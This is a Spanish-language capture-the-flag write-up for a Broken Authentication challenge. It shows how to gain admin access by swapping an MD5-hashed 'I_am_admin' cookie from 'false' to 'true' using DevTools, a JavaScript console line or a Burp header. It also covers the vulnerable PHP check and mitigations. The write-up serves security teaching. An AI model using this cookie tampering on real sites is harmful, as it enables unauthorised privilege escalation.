# A2 - Broken Authentication (Cookie Manipulation)

Vulnerabilidad del OWASP Top 10 (2017). La aplicación controla los privilegios de administrador mediante una cookie `I_am_admin` cuyo valor es un hash MD5 manipulable por el cliente.

---

## Pasos para obtener la flag

### 1. Identificar la cookie

Abrir DevTools (F12) → `Application` → `Cookies`. Se encuentra:
```
I_am_admin=68934a3e9455fa72420237eb05902327
```

### 2. Descifrar el hash

El hash MD5 `68934a3e9455fa72420237eb05902327` → corresponde a `false`.

### 3. Generar el hash de `true`

```bash
echo -n "true" | md5sum
# b326b5062b2f0e69046810717534cb09
```

### 4. Explotar

**Método A – DevTools:**
1. DevTools → `Application` → `Cookies`
2. Cambiar el valor de `I_am_admin` a `b326b5062b2f0e69046810717534cb09`
3. Recargar la página → se muestra la **flag**

**Método B – Consola del navegador:**
```js
document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09; path=/";
location.reload();
```

**Método C – Burp Suite:**
```
Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09
```

### 5. Por qué funciona

El servidor confía ciegamente en el valor de la cookie sin validación criptográfica ni verificación del estado real del usuario:
```php
// Código vulnerable
if ($_COOKIE['I_am_admin'] === md5('true')) {
    showFlag();
}
```

---

## Referencia de hashes MD5

| Valor   | MD5                              |
|---------|----------------------------------|
| `false` | 68934a3e9455fa72420237eb05902327 |
| `true`  | b326b5062b2f0e69046810717534cb09 |

---

## Impacto

- **Escalada de privilegios:** cualquier usuario puede convertirse en administrador.
- **Bypass de autenticación:** sin necesidad de credenciales válidas.
- **Compromiso total:** acceso a funcionalidades y datos restringidos.

---

## Mitigación

1. **Control de acceso en servidor:** verificar el rol del usuario contra la base de datos, nunca desde una cookie.
2. **Sesiones en servidor:** almacenar el estado en `$_SESSION`, no en el cliente.
3. **Firmar cookies con HMAC** o usar **JWT** para detectar manipulaciones.
4. **Flags de seguridad en cookies:** `HttpOnly`, `Secure`, `SameSite=Strict`.
5. **No usar MD5 para seguridad:** está criptográficamente roto; usar SHA-256 con sal o `password_hash()`.
